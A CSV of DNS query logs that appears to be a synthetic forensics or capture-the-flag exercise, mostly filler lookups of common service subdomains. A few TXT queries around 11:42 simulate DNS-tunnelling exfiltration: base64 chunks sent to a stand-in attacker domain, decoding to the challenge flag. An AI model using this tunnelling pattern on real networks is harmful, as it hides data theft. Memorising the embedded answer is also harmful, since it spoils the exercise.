timestamp,client_ip,query_name,query_type
2026-09-10T11:31:27Z,10.0.1.109,sub25.update.microsoft.com,A
2026-09-10T11:31:28Z,10.0.1.109,sub22.google.com,A
2026-09-10T11:31:36Z,10.0.1.109,sub13.fonts.googleapis.com,A
2026-09-10T11:31:59Z,10.0.1.109,sub37.google.com,A
2026-09-10T11:32:01Z,10.0.1.109,sub40.google.com,A
2026-09-10T11:32:13Z,10.0.1.109,sub71.api.github.com,A
2026-09-10T11:32:17Z,10.0.1.109,sub41.fonts.googleapis.com,A
2026-09-10T11:32:31Z,10.0.1.109,sub61.update.microsoft.com,A
2026-09-10T11:32:31Z,10.0.1.109,sub22.update.microsoft.com,A
2026-09-10T11:32:33Z,10.0.1.109,sub55.google.com,A
2026-09-10T11:32:36Z,10.0.1.109,sub22.slack.com,A
2026-09-10T11:32:42Z,10.0.1.109,sub42.google.com,A
2026-09-10T11:32:44Z,10.0.1.109,sub64.slack.com,A
2026-09-10T11:32:50Z,10.0.1.109,sub67.api.github.com,A
2026-09-10T11:33:00Z,10.0.1.109,sub87.update.microsoft.com,A
2026-09-10T11:33:15Z,10.0.1.109,sub61.google.com,A
2026-09-10T11:33:23Z,10.0.1.109,sub31.update.microsoft.com,A
2026-09-10T11:33:34Z,10.0.1.109,sub75.google.com,A
2026-09-10T11:33:34Z,10.0.1.109,sub35.fonts.googleapis.com,A
2026-09-10T11:33:56Z,10.0.1.109,sub11.fonts.googleapis.com,A
2026-09-10T11:34:00Z,10.0.1.109,sub85.google.com,A
2026-09-10T11:34:02Z,10.0.1.109,sub99.update.microsoft.com,A
2026-09-10T11:34:02Z,10.0.1.109,sub93.update.microsoft.com,A
2026-09-10T11:34:08Z,10.0.1.109,sub15.update.microsoft.com,A
2026-09-10T11:34:20Z,10.0.1.109,sub46.google.com,A
2026-09-10T11:34:31Z,10.0.1.109,sub57.google.com,A
2026-09-10T11:34:37Z,10.0.1.109,sub70.api.github.com,A
2026-09-10T11:34:42Z,10.0.1.109,sub82.slack.com,A
2026-09-10T11:34:50Z,10.0.1.109,sub91.google.com,A
2026-09-10T11:35:04Z,10.0.1.109,sub41.slack.com,A
2026-09-10T11:35:09Z,10.0.1.109,sub67.slack.com,A
2026-09-10T11:35:16Z,10.0.1.109,sub18.update.microsoft.com,A
2026-09-10T11:35:20Z,10.0.1.109,sub18.slack.com,A
2026-09-10T11:35:25Z,10.0.1.109,sub64.api.github.com,A
2026-09-10T11:35:27Z,10.0.1.109,sub32.fonts.googleapis.com,A
2026-09-10T11:35:31Z,10.0.1.109,sub49.api.github.com,A
2026-09-10T11:35:35Z,10.0.1.109,sub69.api.github.com,A
2026-09-10T11:35:41Z,10.0.1.109,sub23.api.github.com,A
2026-09-10T11:35:54Z,10.0.1.109,sub65.api.github.com,A
2026-09-10T11:35:57Z,10.0.1.109,sub21.update.microsoft.com,A
2026-09-10T11:35:59Z,10.0.1.109,sub65.google.com,A
2026-09-10T11:36:17Z,10.0.1.109,sub99.fonts.googleapis.com,A
2026-09-10T11:36:25Z,10.0.1.109,sub32.api.github.com,A
2026-09-10T11:36:27Z,10.0.1.109,sub39.update.microsoft.com,A
2026-09-10T11:36:29Z,10.0.1.109,sub92.update.microsoft.com,A
2026-09-10T11:36:30Z,10.0.1.109,sub37.fonts.googleapis.com,A
2026-09-10T11:36:34Z,10.0.1.109,sub31.google.com,A
2026-09-10T11:36:39Z,10.0.1.109,sub97.fonts.googleapis.com,A
2026-09-10T11:36:43Z,10.0.1.109,sub87.google.com,A
2026-09-10T11:36:58Z,10.0.1.109,sub67.slack.com,A
2026-09-10T11:36:58Z,10.0.1.109,sub82.update.microsoft.com,A
2026-09-10T11:37:06Z,10.0.1.109,sub54.update.microsoft.com,A
2026-09-10T11:37:08Z,10.0.1.109,sub64.api.github.com,A
2026-09-10T11:37:22Z,10.0.1.109,sub21.google.com,A
2026-09-10T11:37:28Z,10.0.1.109,sub65.fonts.googleapis.com,A
2026-09-10T11:37:38Z,10.0.1.109,sub71.fonts.googleapis.com,A
2026-09-10T11:37:39Z,10.0.1.109,sub74.update.microsoft.com,A
2026-09-10T11:37:48Z,10.0.1.109,sub61.update.microsoft.com,A
2026-09-10T11:37:48Z,10.0.1.109,sub88.update.microsoft.com,A
2026-09-10T11:37:49Z,10.0.1.109,sub33.update.microsoft.com,A
2026-09-10T11:37:51Z,10.0.1.109,sub90.fonts.googleapis.com,A
2026-09-10T11:37:56Z,10.0.1.109,sub50.fonts.googleapis.com,A
2026-09-10T11:37:57Z,10.0.1.109,sub95.api.github.com,A
2026-09-10T11:37:57Z,10.0.1.109,sub44.fonts.googleapis.com,A
2026-09-10T11:37:59Z,10.0.1.109,sub87.google.com,A
2026-09-10T11:38:09Z,10.0.1.109,sub54.fonts.googleapis.com,A
2026-09-10T11:38:13Z,10.0.1.109,sub37.fonts.googleapis.com,A
2026-09-10T11:38:39Z,10.0.1.109,sub64.api.github.com,A
2026-09-10T11:38:40Z,10.0.1.109,sub36.update.microsoft.com,A
2026-09-10T11:38:45Z,10.0.1.109,sub84.slack.com,A
2026-09-10T11:38:49Z,10.0.1.109,sub99.update.microsoft.com,A
2026-09-10T11:38:53Z,10.0.1.109,sub60.google.com,A
2026-09-10T11:38:58Z,10.0.1.109,sub60.slack.com,A
2026-09-10T11:38:58Z,10.0.1.109,sub97.slack.com,A
2026-09-10T11:39:01Z,10.0.1.109,sub29.api.github.com,A
2026-09-10T11:39:09Z,10.0.1.109,sub30.api.github.com,A
2026-09-10T11:39:12Z,10.0.1.109,sub89.api.github.com,A
2026-09-10T11:39:13Z,10.0.1.109,sub75.api.github.com,A
2026-09-10T11:39:16Z,10.0.1.109,sub21.google.com,A
2026-09-10T11:39:16Z,10.0.1.109,sub32.fonts.googleapis.com,A
2026-09-10T11:39:17Z,10.0.1.109,sub72.fonts.googleapis.com,A
2026-09-10T11:39:31Z,10.0.1.109,sub41.fonts.googleapis.com,A
2026-09-10T11:39:38Z,10.0.1.109,sub6.fonts.googleapis.com,A
2026-09-10T11:40:05Z,10.0.1.109,sub50.fonts.googleapis.com,A
2026-09-10T11:40:21Z,10.0.1.109,sub19.fonts.googleapis.com,A
2026-09-10T11:40:21Z,10.0.1.109,sub43.api.github.com,A
2026-09-10T11:40:27Z,10.0.1.109,sub2.update.microsoft.com,A
2026-09-10T11:40:30Z,10.0.1.109,sub6.google.com,A
2026-09-10T11:40:36Z,10.0.1.109,sub56.slack.com,A
2026-09-10T11:40:47Z,10.0.1.109,sub6.api.github.com,A
2026-09-10T11:40:52Z,10.0.1.109,sub54.slack.com,A
2026-09-10T11:41:05Z,10.0.1.109,sub32.slack.com,A
2026-09-10T11:41:07Z,10.0.1.109,sub8.update.microsoft.com,A
2026-09-10T11:41:19Z,10.0.1.109,sub31.slack.com,A
2026-09-10T11:41:24Z,10.0.1.109,sub89.update.microsoft.com,A
2026-09-10T11:41:36Z,10.0.1.109,sub68.google.com,A
2026-09-10T11:42:03Z,10.0.1.109,sub45.api.github.com,A
2026-09-10T11:42:08Z,10.0.1.109,sub64.fonts.googleapis.com,A
2026-09-10T11:42:12Z,10.0.1.109,sub81.api.github.com,A
2026-09-10T11:42:22Z,10.0.1.109,sub84.google.com,A
2026-09-10T11:42:24Z,10.0.1.109,sub7.api.github.com,A
2026-09-10T11:42:35Z,10.0.1.109,sub56.update.microsoft.com,A
2026-09-10T11:42:40Z,10.0.1.109,chunk00.RkxBR3tkbnNfdHVu.ns-tunnel.attacker-dns.org,TXT
2026-09-10T11:42:43Z,10.0.1.109,chunk01.bmVsaW5nX2RhdGFf.ns-tunnel.attacker-dns.org,TXT
2026-09-10T11:42:46Z,10.0.1.109,chunk02.ZXhmaWxfdW5jb3Zl.ns-tunnel.attacker-dns.org,TXT
2026-09-10T11:42:48Z,10.0.1.109,sub11.api.github.com,A
2026-09-10T11:42:49Z,10.0.1.109,chunk03.cmVkfQ.ns-tunnel.attacker-dns.org,TXT
2026-09-10T11:42:57Z,10.0.1.109,sub32.google.com,A
2026-09-10T11:42:59Z,10.0.1.109,sub72.update.microsoft.com,A
2026-09-10T11:43:05Z,10.0.1.109,sub56.slack.com,A
2026-09-10T11:43:10Z,10.0.1.109,exfil-payload.RkxBR3tkbnNfdHVubmVsaW5nX2RhdGFfZXhmaWxfdW5jb3ZlcmVkfQ.ns-tunnel.attacker-dns.org,TXT
2026-09-10T11:43:27Z,10.0.1.109,sub51.google.com,A
2026-09-10T11:43:36Z,10.0.1.109,sub22.slack.com,A
2026-09-10T11:43:43Z,10.0.1.109,sub27.google.com,A
2026-09-10T11:44:00Z,10.0.1.109,sub36.fonts.googleapis.com,A
2026-09-10T11:44:01Z,10.0.1.109,sub47.fonts.googleapis.com,A
2026-09-10T11:44:13Z,10.0.1.109,sub72.google.com,A
2026-09-10T11:44:14Z,10.0.1.109,sub73.update.microsoft.com,A
2026-09-10T11:44:19Z,10.0.1.109,sub3.google.com,A
2026-09-10T11:44:20Z,10.0.1.109,sub81.update.microsoft.com,A
2026-09-10T11:44:28Z,10.0.1.109,sub62.google.com,A
2026-09-10T11:44:59Z,10.0.1.109,sub89.update.microsoft.com,A
2026-09-10T11:45:00Z,10.0.1.109,sub13.fonts.googleapis.com,A
2026-09-10T11:45:01Z,10.0.1.109,sub38.api.github.com,A
2026-09-10T11:45:05Z,10.0.1.109,sub32.update.microsoft.com,A
2026-09-10T11:45:14Z,10.0.1.109,sub14.api.github.com,A
2026-09-10T11:45:17Z,10.0.1.109,sub59.google.com,A
2026-09-10T11:45:19Z,10.0.1.109,sub7.google.com,A
2026-09-10T11:45:22Z,10.0.1.109,sub34.api.github.com,A
2026-09-10T11:45:25Z,10.0.1.109,sub84.slack.com,A
2026-09-10T11:45:32Z,10.0.1.109,sub84.api.github.com,A
2026-09-10T11:45:42Z,10.0.1.109,sub19.fonts.googleapis.com,A
2026-09-10T11:45:44Z,10.0.1.109,sub10.google.com,A
2026-09-10T11:45:47Z,10.0.1.109,sub96.slack.com,A
2026-09-10T11:45:51Z,10.0.1.109,sub81.api.github.com,A
2026-09-10T11:46:14Z,10.0.1.109,sub73.fonts.googleapis.com,A
2026-09-10T11:46:25Z,10.0.1.109,sub99.api.github.com,A
2026-09-10T11:46:35Z,10.0.1.109,sub29.google.com,A
2026-09-10T11:46:39Z,10.0.1.109,sub99.slack.com,A
2026-09-10T11:46:39Z,10.0.1.109,sub67.api.github.com,A
2026-09-10T11:46:52Z,10.0.1.109,sub31.fonts.googleapis.com,A
2026-09-10T11:47:14Z,10.0.1.109,sub60.slack.com,A
2026-09-10T11:47:31Z,10.0.1.109,sub98.slack.com,A
2026-09-10T11:47:36Z,10.0.1.109,sub89.api.github.com,A
2026-09-10T11:47:37Z,10.0.1.109,sub43.slack.com,A
2026-09-10T11:47:41Z,10.0.1.109,sub82.slack.com,A
2026-09-10T11:47:58Z,10.0.1.109,sub33.fonts.googleapis.com,A
2026-09-10T11:48:05Z,10.0.1.109,sub6.api.github.com,A
2026-09-10T11:48:09Z,10.0.1.109,sub55.google.com,A
2026-09-10T11:48:16Z,10.0.1.109,sub30.fonts.googleapis.com,A
2026-09-10T11:48:19Z,10.0.1.109,sub58.update.microsoft.com,A
2026-09-10T11:48:29Z,10.0.1.109,sub11.google.com,A
2026-09-10T11:48:30Z,10.0.1.109,sub31.google.com,A
2026-09-10T11:48:34Z,10.0.1.109,sub49.fonts.googleapis.com,A
2026-09-10T11:48:37Z,10.0.1.109,sub43.api.github.com,A
2026-09-10T11:48:39Z,10.0.1.109,sub97.api.github.com,A
2026-09-10T11:48:44Z,10.0.1.109,sub50.google.com,A
2026-09-10T11:49:12Z,10.0.1.109,sub58.update.microsoft.com,A
2026-09-10T11:49:27Z,10.0.1.109,sub97.update.microsoft.com,A
2026-09-10T11:49:34Z,10.0.1.109,sub31.update.microsoft.com,A
2026-09-10T11:49:39Z,10.0.1.109,sub3.update.microsoft.com,A
2026-09-10T11:49:52Z,10.0.1.109,sub1.update.microsoft.com,A
2026-09-10T11:50:03Z,10.0.1.109,sub59.update.microsoft.com,A
2026-09-10T11:50:18Z,10.0.1.109,sub43.google.com,A
2026-09-10T11:50:20Z,10.0.1.109,sub10.fonts.googleapis.com,A
2026-09-10T11:50:23Z,10.0.1.109,sub55.update.microsoft.com,A
2026-09-10T11:50:24Z,10.0.1.109,sub37.fonts.googleapis.com,A
2026-09-10T11:50:25Z,10.0.1.109,sub52.update.microsoft.com,A
2026-09-10T11:50:27Z,10.0.1.109,sub59.update.microsoft.com,A
2026-09-10T11:50:36Z,10.0.1.109,sub9.fonts.googleapis.com,A
2026-09-10T11:50:52Z,10.0.1.109,sub89.api.github.com,A
2026-09-10T11:50:55Z,10.0.1.109,sub86.slack.com,A
2026-09-10T11:51:06Z,10.0.1.109,sub13.google.com,A
2026-09-10T11:51:21Z,10.0.1.109,sub13.api.github.com,A
2026-09-10T11:51:25Z,10.0.1.109,sub20.api.github.com,A
2026-09-10T11:51:26Z,10.0.1.109,sub17.google.com,A
2026-09-10T11:51:31Z,10.0.1.109,sub34.slack.com,A
2026-09-10T11:51:49Z,10.0.1.109,sub4.fonts.googleapis.com,A
2026-09-10T11:52:08Z,10.0.1.109,sub57.slack.com,A
2026-09-10T11:52:18Z,10.0.1.109,sub37.api.github.com,A
2026-09-10T11:52:22Z,10.0.1.109,sub35.update.microsoft.com,A
2026-09-10T11:52:33Z,10.0.1.109,sub83.slack.com,A
2026-09-10T11:52:37Z,10.0.1.109,sub89.google.com,A
2026-09-10T11:52:49Z,10.0.1.109,sub95.api.github.com,A
2026-09-10T11:53:02Z,10.0.1.109,sub75.google.com,A
2026-09-10T11:53:34Z,10.0.1.109,sub12.fonts.googleapis.com,A
2026-09-10T11:53:36Z,10.0.1.109,sub82.update.microsoft.com,A
2026-09-10T11:53:43Z,10.0.1.109,sub56.update.microsoft.com,A
2026-09-10T11:53:46Z,10.0.1.109,sub31.api.github.com,A
2026-09-10T11:54:01Z,10.0.1.109,sub36.fonts.googleapis.com,A
2026-09-10T11:54:17Z,10.0.1.109,sub36.fonts.googleapis.com,A
2026-09-10T11:54:26Z,10.0.1.109,sub68.update.microsoft.com,A
2026-09-10T11:54:45Z,10.0.1.109,sub68.fonts.googleapis.com,A
2026-09-10T11:54:46Z,10.0.1.109,sub54.api.github.com,A
2026-09-10T11:54:55Z,10.0.1.109,sub99.update.microsoft.com,A
2026-09-10T11:54:56Z,10.0.1.109,sub90.api.github.com,A
2026-09-10T11:55:23Z,10.0.1.109,sub12.slack.com,A
2026-09-10T11:55:35Z,10.0.1.109,sub46.fonts.googleapis.com,A
2026-09-10T11:55:39Z,10.0.1.109,sub89.api.github.com,A
2026-09-10T11:55:47Z,10.0.1.109,sub95.update.microsoft.com,A
2026-09-10T11:55:48Z,10.0.1.109,sub81.google.com,A
2026-09-10T11:55:50Z,10.0.1.109,sub28.api.github.com,A
2026-09-10T11:55:53Z,10.0.1.109,sub24.slack.com,A
2026-09-10T11:55:59Z,10.0.1.109,sub73.google.com,A
2026-09-10T11:55:59Z,10.0.1.109,sub60.google.com,A
2026-09-10T11:56:09Z,10.0.1.109,sub34.api.github.com,A
2026-09-10T11:56:10Z,10.0.1.109,sub33.update.microsoft.com,A
2026-09-10T11:56:25Z,10.0.1.109,sub27.slack.com,A
2026-09-10T11:56:48Z,10.0.1.109,sub6.slack.com,A
2026-09-10T11:56:49Z,10.0.1.109,sub75.slack.com,A
2026-09-10T11:57:00Z,10.0.1.109,sub91.api.github.com,A
2026-09-10T11:57:20Z,10.0.1.109,sub17.api.github.com,A
2026-09-10T11:57:22Z,10.0.1.109,sub11.update.microsoft.com,A
2026-09-10T11:57:46Z,10.0.1.109,sub54.update.microsoft.com,A
2026-09-10T11:57:47Z,10.0.1.109,sub98.google.com,A
2026-09-10T11:57:50Z,10.0.1.109,sub8.slack.com,A
2026-09-10T11:57:56Z,10.0.1.109,sub3.update.microsoft.com,A
2026-09-10T11:57:58Z,10.0.1.109,sub37.slack.com,A
2026-09-10T11:57:59Z,10.0.1.109,sub24.update.microsoft.com,A
2026-09-10T11:58:01Z,10.0.1.109,sub70.fonts.googleapis.com,A
2026-09-10T11:58:15Z,10.0.1.109,sub36.google.com,A
2026-09-10T11:58:16Z,10.0.1.109,sub8.fonts.googleapis.com,A
2026-09-10T11:58:25Z,10.0.1.109,sub29.google.com,A
2026-09-10T11:58:36Z,10.0.1.109,sub29.slack.com,A
2026-09-10T11:59:03Z,10.0.1.109,sub72.api.github.com,A
2026-09-10T11:59:34Z,10.0.1.109,sub66.slack.com,A
2026-09-10T11:59:37Z,10.0.1.109,sub19.slack.com,A
2026-09-10T11:59:46Z,10.0.1.109,sub49.fonts.googleapis.com,A
2026-09-10T11:59:48Z,10.0.1.109,sub12.update.microsoft.com,A
2026-09-10T11:59:54Z,10.0.1.109,sub68.api.github.com,A
2026-09-10T12:00:08Z,10.0.1.109,sub99.update.microsoft.com,A
2026-09-10T12:00:40Z,10.0.1.109,sub85.api.github.com,A
2026-09-10T12:00:46Z,10.0.1.109,sub3.fonts.googleapis.com,A
2026-09-10T12:00:47Z,10.0.1.109,sub10.api.github.com,A
2026-09-10T12:00:49Z,10.0.1.109,sub14.google.com,A
2026-09-10T12:00:51Z,10.0.1.109,sub33.slack.com,A
2026-09-10T12:00:54Z,10.0.1.109,sub5.google.com,A
2026-09-10T12:00:54Z,10.0.1.109,sub88.fonts.googleapis.com,A
2026-09-10T12:00:58Z,10.0.1.109,sub1.api.github.com,A
2026-09-10T12:01:05Z,10.0.1.109,sub53.fonts.googleapis.com,A
2026-09-10T12:01:05Z,10.0.1.109,sub98.update.microsoft.com,A
2026-09-10T12:01:19Z,10.0.1.109,sub8.slack.com,A
2026-09-10T12:01:34Z,10.0.1.109,sub71.slack.com,A
2026-09-10T12:01:38Z,10.0.1.109,sub77.fonts.googleapis.com,A
2026-09-10T12:01:52Z,10.0.1.109,sub75.google.com,A
2026-09-10T12:01:58Z,10.0.1.109,sub99.slack.com,A
2026-09-10T12:02:28Z,10.0.1.109,sub26.api.github.com,A
2026-09-10T12:02:32Z,10.0.1.109,sub74.fonts.googleapis.com,A
2026-09-10T12:02:45Z,10.0.1.109,sub1.fonts.googleapis.com,A
2026-09-10T12:02:51Z,10.0.1.109,sub99.fonts.googleapis.com,A
2026-09-10T12:03:01Z,10.0.1.109,sub93.fonts.googleapis.com,A
2026-09-10T12:03:15Z,10.0.1.109,sub47.update.microsoft.com,A
2026-09-10T12:03:18Z,10.0.1.109,sub40.update.microsoft.com,A
2026-09-10T12:03:23Z,10.0.1.109,sub48.update.microsoft.com,A
2026-09-10T12:03:25Z,10.0.1.109,sub81.update.microsoft.com,A
2026-09-10T12:03:33Z,10.0.1.109,sub78.api.github.com,A
2026-09-10T12:03:37Z,10.0.1.109,sub83.slack.com,A
2026-09-10T12:03:45Z,10.0.1.109,sub38.api.github.com,A
2026-09-10T12:03:50Z,10.0.1.109,sub74.api.github.com,A
2026-09-10T12:03:57Z,10.0.1.109,sub67.api.github.com,A
2026-09-10T12:03:59Z,10.0.1.109,sub69.google.com,A
2026-09-10T12:04:04Z,10.0.1.109,sub85.google.com,A
2026-09-10T12:04:05Z,10.0.1.109,sub78.update.microsoft.com,A
2026-09-10T12:04:07Z,10.0.1.109,sub38.fonts.googleapis.com,A
2026-09-10T12:04:11Z,10.0.1.109,sub73.google.com,A
2026-09-10T12:04:17Z,10.0.1.109,sub34.api.github.com,A
2026-09-10T12:04:22Z,10.0.1.109,sub54.api.github.com,A
2026-09-10T12:04:35Z,10.0.1.109,sub6.slack.com,A
2026-09-10T12:04:39Z,10.0.1.109,sub78.google.com,A
2026-09-10T12:04:44Z,10.0.1.109,sub71.update.microsoft.com,A
2026-09-10T12:05:03Z,10.0.1.109,sub94.fonts.googleapis.com,A
2026-09-10T12:05:11Z,10.0.1.109,sub67.update.microsoft.com,A
2026-09-10T12:05:13Z,10.0.1.109,sub46.google.com,A
2026-09-10T12:05:14Z,10.0.1.109,sub39.api.github.com,A
2026-09-10T12:05:17Z,10.0.1.109,sub10.fonts.googleapis.com,A
2026-09-10T12:05:18Z,10.0.1.109,sub87.google.com,A
2026-09-10T12:05:23Z,10.0.1.109,sub91.update.microsoft.com,A
2026-09-10T12:05:24Z,10.0.1.109,sub59.update.microsoft.com,A
2026-09-10T12:05:41Z,10.0.1.109,sub47.slack.com,A
2026-09-10T12:05:44Z,10.0.1.109,sub81.api.github.com,A
2026-09-10T12:05:50Z,10.0.1.109,sub90.google.com,A
2026-09-10T12:05:56Z,10.0.1.109,sub18.slack.com,A
2026-09-10T12:06:00Z,10.0.1.109,sub52.fonts.googleapis.com,A
2026-09-10T12:06:09Z,10.0.1.109,sub2.fonts.googleapis.com,A
2026-09-10T12:06:38Z,10.0.1.109,sub80.slack.com,A
2026-09-10T12:06:40Z,10.0.1.109,sub58.google.com,A
2026-09-10T12:06:42Z,10.0.1.109,sub83.api.github.com,A
2026-09-10T12:06:45Z,10.0.1.109,sub23.fonts.googleapis.com,A
2026-09-10T12:06:47Z,10.0.1.109,sub87.slack.com,A
2026-09-10T12:06:52Z,10.0.1.109,sub64.google.com,A
2026-09-10T12:06:57Z,10.0.1.109,sub9.google.com,A
2026-09-10T12:07:03Z,10.0.1.109,sub24.update.microsoft.com,A
2026-09-10T12:07:10Z,10.0.1.109,sub42.api.github.com,A
2026-09-10T12:07:11Z,10.0.1.109,sub1.google.com,A
2026-09-10T12:07:13Z,10.0.1.109,sub45.slack.com,A
2026-09-10T12:07:14Z,10.0.1.109,sub85.fonts.googleapis.com,A
2026-09-10T12:07:21Z,10.0.1.109,sub85.google.com,A
2026-09-10T12:07:24Z,10.0.1.109,sub47.fonts.googleapis.com,A
2026-09-10T12:07:32Z,10.0.1.109,sub78.update.microsoft.com,A
2026-09-10T12:07:37Z,10.0.1.109,sub55.slack.com,A
2026-09-10T12:07:40Z,10.0.1.109,sub36.api.github.com,A
2026-09-10T12:07:52Z,10.0.1.109,sub43.api.github.com,A
2026-09-10T12:07:58Z,10.0.1.109,sub39.fonts.googleapis.com,A
2026-09-10T12:07:58Z,10.0.1.109,sub91.google.com,A
2026-09-10T12:08:00Z,10.0.1.109,sub83.api.github.com,A
2026-09-10T12:08:06Z,10.0.1.109,sub98.slack.com,A
2026-09-10T12:08:13Z,10.0.1.109,sub61.fonts.googleapis.com,A
2026-09-10T12:08:17Z,10.0.1.109,sub63.update.microsoft.com,A
2026-09-10T12:08:19Z,10.0.1.109,sub96.update.microsoft.com,A
2026-09-10T12:08:23Z,10.0.1.109,sub85.update.microsoft.com,A
2026-09-10T12:08:33Z,10.0.1.109,sub59.slack.com,A
2026-09-10T12:08:42Z,10.0.1.109,sub50.update.microsoft.com,A
2026-09-10T12:08:44Z,10.0.1.109,sub96.api.github.com,A
2026-09-10T12:08:44Z,10.0.1.109,sub26.slack.com,A
2026-09-10T12:08:53Z,10.0.1.109,sub3.google.com,A
2026-09-10T12:08:57Z,10.0.1.109,sub15.slack.com,A
2026-09-10T12:09:11Z,10.0.1.109,sub89.fonts.googleapis.com,A
2026-09-10T12:09:38Z,10.0.1.109,sub33.update.microsoft.com,A
2026-09-10T12:09:51Z,10.0.1.109,sub27.api.github.com,A
2026-09-10T12:09:56Z,10.0.1.109,sub71.google.com,A
2026-09-10T12:09:58Z,10.0.1.109,sub45.update.microsoft.com,A
2026-09-10T12:10:03Z,10.0.1.109,sub6.api.github.com,A
2026-09-10T12:10:19Z,10.0.1.109,sub91.slack.com,A
2026-09-10T12:10:21Z,10.0.1.109,sub18.fonts.googleapis.com,A
2026-09-10T12:10:32Z,10.0.1.109,sub95.update.microsoft.com,A
2026-09-10T12:10:57Z,10.0.1.109,sub83.slack.com,A
2026-09-10T12:11:02Z,10.0.1.109,sub45.update.microsoft.com,A
2026-09-10T12:11:34Z,10.0.1.109,sub58.update.microsoft.com,A
2026-09-10T12:11:35Z,10.0.1.109,sub69.update.microsoft.com,A
2026-09-10T12:11:58Z,10.0.1.109,sub61.api.github.com,A
2026-09-10T12:12:07Z,10.0.1.109,sub49.slack.com,A
2026-09-10T12:12:08Z,10.0.1.109,sub85.slack.com,A
2026-09-10T12:12:13Z,10.0.1.109,sub86.google.com,A
2026-09-10T12:12:27Z,10.0.1.109,sub56.api.github.com,A
2026-09-10T12:12:28Z,10.0.1.109,sub65.api.github.com,A
2026-09-10T12:12:28Z,10.0.1.109,sub79.fonts.googleapis.com,A
2026-09-10T12:12:28Z,10.0.1.109,sub79.slack.com,A
2026-09-10T12:12:33Z,10.0.1.109,sub93.slack.com,A
2026-09-10T12:12:53Z,10.0.1.109,sub87.fonts.googleapis.com,A
2026-09-10T12:13:10Z,10.0.1.109,sub87.update.microsoft.com,A
2026-09-10T12:13:11Z,10.0.1.109,sub72.api.github.com,A
2026-09-10T12:13:13Z,10.0.1.109,sub23.api.github.com,A
2026-09-10T12:13:16Z,10.0.1.109,sub49.fonts.googleapis.com,A
2026-09-10T12:13:16Z,10.0.1.109,sub67.fonts.googleapis.com,A
2026-09-10T12:13:17Z,10.0.1.109,sub78.api.github.com,A
2026-09-10T12:13:26Z,10.0.1.109,sub82.update.microsoft.com,A
2026-09-10T12:13:28Z,10.0.1.109,sub91.update.microsoft.com,A
2026-09-10T12:13:48Z,10.0.1.109,sub85.update.microsoft.com,A
2026-09-10T12:13:53Z,10.0.1.109,sub44.google.com,A
2026-09-10T12:13:53Z,10.0.1.109,sub72.google.com,A
2026-09-10T12:14:18Z,10.0.1.109,sub77.fonts.googleapis.com,A
2026-09-10T12:14:20Z,10.0.1.109,sub69.api.github.com,A
2026-09-10T12:14:33Z,10.0.1.109,sub50.api.github.com,A
2026-09-10T12:14:50Z,10.0.1.109,sub15.api.github.com,A
2026-09-10T12:15:01Z,10.0.1.109,sub21.google.com,A
2026-09-10T12:15:03Z,10.0.1.109,sub41.slack.com,A
2026-09-10T12:15:04Z,10.0.1.109,sub1.api.github.com,A
2026-09-10T12:15:12Z,10.0.1.109,sub98.fonts.googleapis.com,A
2026-09-10T12:15:20Z,10.0.1.109,sub12.fonts.googleapis.com,A
2026-09-10T12:15:21Z,10.0.1.109,sub29.api.github.com,A
2026-09-10T12:15:30Z,10.0.1.109,sub53.google.com,A
2026-09-10T12:15:33Z,10.0.1.109,sub89.slack.com,A
2026-09-10T12:15:42Z,10.0.1.109,sub11.fonts.googleapis.com,A
2026-09-10T12:15:43Z,10.0.1.109,sub24.api.github.com,A
2026-09-10T12:15:47Z,10.0.1.109,sub85.api.github.com,A
2026-09-10T12:15:47Z,10.0.1.109,sub61.fonts.googleapis.com,A
2026-09-10T12:15:48Z,10.0.1.109,sub62.api.github.com,A
2026-09-10T12:15:59Z,10.0.1.109,sub51.slack.com,A
2026-09-10T12:16:04Z,10.0.1.109,sub13.google.com,A
2026-09-10T12:16:18Z,10.0.1.109,sub31.google.com,A
2026-09-10T12:16:20Z,10.0.1.109,sub32.update.microsoft.com,A
2026-09-10T12:16:43Z,10.0.1.109,sub49.update.microsoft.com,A
2026-09-10T12:16:48Z,10.0.1.109,sub91.fonts.googleapis.com,A
2026-09-10T12:16:54Z,10.0.1.109,sub67.update.microsoft.com,A
2026-09-10T12:17:09Z,10.0.1.109,sub66.slack.com,A
2026-09-10T12:17:12Z,10.0.1.109,sub19.slack.com,A
2026-09-10T12:17:19Z,10.0.1.109,sub74.slack.com,A
2026-09-10T12:17:19Z,10.0.1.109,sub76.google.com,A
2026-09-10T12:17:25Z,10.0.1.109,sub40.google.com,A
2026-09-10T12:17:29Z,10.0.1.109,sub81.google.com,A
2026-09-10T12:17:39Z,10.0.1.109,sub48.slack.com,A
2026-09-10T12:17:47Z,10.0.1.109,sub49.google.com,A
